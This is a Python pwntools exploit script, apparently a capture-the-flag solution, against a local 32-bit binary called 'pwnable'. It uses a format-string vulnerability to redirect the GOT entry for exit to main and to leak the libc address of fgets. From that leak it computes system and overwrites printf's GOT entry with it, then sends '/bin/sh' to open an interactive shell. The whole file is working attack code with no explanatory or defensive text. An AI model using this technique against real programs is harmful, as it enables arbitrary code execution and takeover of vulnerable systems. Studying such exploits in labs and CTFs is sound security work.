from pwn import *

elf = ELF("./pwnable")
libc = ELF("./local_libc.so.6")

p = process(elf.path)






# overwrite .got(exit) <- main address
buf = b"AA"
buf += p32(elf.got['exit'])
buf += b"%" + str(elf.symbols['main']  - len(buf)).encode() + b"c"
buf += b"%11$n."

print(buf)
print(p.recvuntil("back.\n"))
p.sendline(buf)


# leak libc base and calc libc system addr
buf = b"AA"
buf += b"BBBB"
buf += p32(elf.got['fgets'])
buf += b".%12$s."

p.recvuntil("Give me a string to echo back.\n")
p.sendline(buf)

ret_data = p.recvline().split(b".")
leak_fgets_addr = u32(ret_data[-2][:4])
log.success("leak fgets addr = " + str(hex(leak_fgets_addr)) )
system_addr = leak_fgets_addr - libc.symbols['fgets'] + libc.symbols['system']
log.success("system_addr = " + str(hex(system_addr)))



# overwrite .got(printf) <- system_addr
buf = b"AA"

buf += p32(elf.got['printf'])
buf += p32(elf.got['printf'] + 2)

# for debug
#buf += p32(0x804a024)
#buf += p32(0x804a026)

buf += b"%" + str( (system_addr & 0xffff) - 10).encode() + b"c"
buf += b"%11$hn"
buf += b"%" + str((system_addr>>16) - (system_addr & 0xffff)).encode() + b"c"
buf += b"%12$hn."




print(p.recvuntil("back.\n"))
print(buf)
p.sendline(buf)

log.info("overwrite .got(printf)["+hex(elf.got['printf']) + "] <- system_addr")


# send "/bin/sh", and execute system("/bin/sh")
p.recvuntil("back.\n")
p.sendline(b"/bin/sh\x00")




p.interactive()
